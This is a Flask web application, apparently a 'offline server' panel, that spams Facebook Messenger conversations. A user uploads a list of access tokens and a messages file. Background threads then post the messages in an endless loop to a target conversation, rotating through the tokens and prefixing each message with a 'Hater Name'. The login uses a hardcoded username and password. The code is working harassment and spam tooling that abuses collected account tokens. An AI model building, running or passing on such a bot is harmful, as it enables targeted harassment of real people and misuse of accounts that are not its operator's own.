from flask import Flask, request, render_template_string, redirect, url_for, session
import requests
from threading import Thread, Event
import time
import os
import random
import string

app = Flask(__name__)
app.secret_key = 'secret_key_for_session_management'  # Replace with a strong secret key

USERNAME = "SURAJOBEROY"
PASSWORD = "SURAJ2227"

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    max_tokens = len(access_tokens)
    num_messages = len(messages)
    
    message_index = 0
    while not stop_event.is_set():
        try:
            token_index = message_index % max_tokens
            access_token = access_tokens[token_index]
            message = f"{mn} {messages[message_index % num_messages]}"
            
            parameters = {'access_token': access_token, 'message': message}
            post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
            response = requests.post(post_url, json=parameters, headers=headers)
            
            if response.ok:
                print(f"[+] Message Sent: {message} using Token {token_index + 1}")
            else:
                print(f"[x] Failed to send: {message}")
            
            message_index += 1
            time.sleep(time_interval)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(30)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('send_message'))
        else:
            return '''
            <h3>Invalid credentials. Please try again.</h3>
            <a href="/login">Go back to Login</a>
            '''
    return '''
        <html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚜️suraj Oberoy⚜️</title>
    <style>
        body {
            background-image: url('https://ibb.co/1Y4DTdw4.jpg');
            background-size: cover;
            background-repeat: no-repeat;
            font-family: Arial, sans-serif;
        }

        .login-container {
            max-width: 400px;
            margin: 100px auto;
            padding: 20px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            box-shadow: 0 0 10px white;
            color: white;
        }

        .login-container h2 {
            text-align: center;
            color: white;
            font-family: cursive;
            margin-bottom: 20px;
        }

        .login-container label {
            display: block;
            margin-bottom: 5px;
            font-size: 16px;
            color: white;
        }

        .login-container input {
            width: 100%;
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid white;
            border-radius: 25px; 
            background: transparent;
            color: white;
            font-size: 18px; 
        }

        .login-container input::placeholder {
            color: #ccc;
        }

        .login-container button {
            display: block;
            width: 100%;
            padding: 15px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 25px; 
            cursor: pointer;
            font-size: 18px;
        }

        .login-container button:hover {
            background-color: red;
        }

        .login-container .warning {
            margin-top: 15px;
            text-align: center;
            font-size: 14px;
            color: yellow;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <form method="post">
            <h2>Login</h2>
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" placeholder="Enter Username" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" placeholder="Enter Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="warning">
            <p><strong>Note:</strong> For username or password, please contact the admin.</p>
        </div>
    </div>
</body>
</html>
    '''

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        access_tokens = txt_file.read().decode().strip().splitlines()

        messages_file = request.files['messagesFile']
        messages = messages_file.read().decode().strip().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>⚜️suraj oberoy⚜️</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Poppins', sans-serif;
}

body {
    min-height: 100vh;
    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
    display: flex;
    align-items: center;
    justify-content: center;
}

.container {
    width: 100%;
    max-width: 720px;
    padding: 30px;
    background: rgba(255, 255, 255, 0.08);
    backdrop-filter: blur(15px);
    border-radius: 20px;
    box-shadow: 0 0 25px rgba(0,255,255,0.2);
    color: #fff;
}

h3 {
    text-align: center;
    margin-bottom: 25px;
    font-weight: 600;
    letter-spacing: 1px;
    color: #00f7ff;
}

label {
    font-size: 14px;
    margin-bottom: 5px;
    display: block;
}

.form-control {
    width: 100%;
    padding: 12px 15px;
    margin-bottom: 15px;
    border-radius: 12px;
    border: 1px solid rgba(255,255,255,0.2);
    background: transparent;
    color: #fff;
    outline: none;
}

.form-control::placeholder {
    color: #ccc;
}

.form-control:focus {
    border-color: #00f7ff;
    box-shadow: 0 0 10px rgba(0,247,255,0.5);
}

.btn-submit {
    width: 100%;
    padding: 12px;
    border-radius: 30px;
    border: none;
    font-size: 16px;
    font-weight: 600;
    color: #000;
    background: linear-gradient(90deg, #00f7ff, #00ff9d);
    cursor: pointer;
    transition: 0.3s ease;
    margin-top: 5px;
}

.btn-submit:hover {
    transform: scale(1.05);
    box-shadow: 0 0 15px rgba(0,247,255,0.8);
}

.logout {
    text-align: center;
    margin-top: 20px;
}

.logout a {
    color: #fff;
    text-decoration: none;
    padding: 10px 25px;
    border-radius: 25px;
    background: linear-gradient(90deg, #ff416c, #ff4b2b);
    font-weight: 600;
    transition: 0.3s;
}

.logout a:hover {
    box-shadow: 0 0 15px rgba(255,75,43,0.8);
}

.footer {
    margin-top: 25px;
    text-align: center;
    font-size: 13px;
    color: #ddd;
}
</style>
</head>

<body>
<div class="container">

<h3>⚜️suraj oberoy⚜️ OFFLINE SERVER</h3>

<form method="post" enctype="multipart/form-data">
    <label>Conversation ID</label>
    <input type="text" name="threadId" class="form-control" placeholder="Enter Conversation ID" required>

    <label>Hater Name</label>
    <input type="text" name="kidx" class="form-control" placeholder="Enter Name" required>

    <label>Time Interval (seconds)</label>
    <input type="number" name="time" class="form-control" placeholder="Time Interval" required>

    <label>Upload Token File</label>
    <input type="file" name="txtFile" class="form-control" accept=".txt" required>

    <label>Upload Messages File</label>
    <input type="file" name="messagesFile" class="form-control" accept=".txt" required>

    <button type="submit" class="btn-submit">🚀 Start Task</button>
</form>

<form method="post" action="/stop">
    <label>Task ID to Stop</label>
    <input type="text" name="taskId" class="form-control" placeholder="Enter Task ID" required>
    <button type="submit" class="btn-submit">⛔ Stop Task</button>
</form>

<div class="logout">
    <a href="/logout">Logout</a>
</div>

<div class="footer">
    Made with ❤️ by SURAJ BRAND ON FIRE ⚜️✊
</div>

</div>
</body>
</html>
    '''

@app.route('/stop', methods=['POST'])
def stop_task():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f"Task {task_id} stopped."
    else:
        return f"No task found with ID {task_id}."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
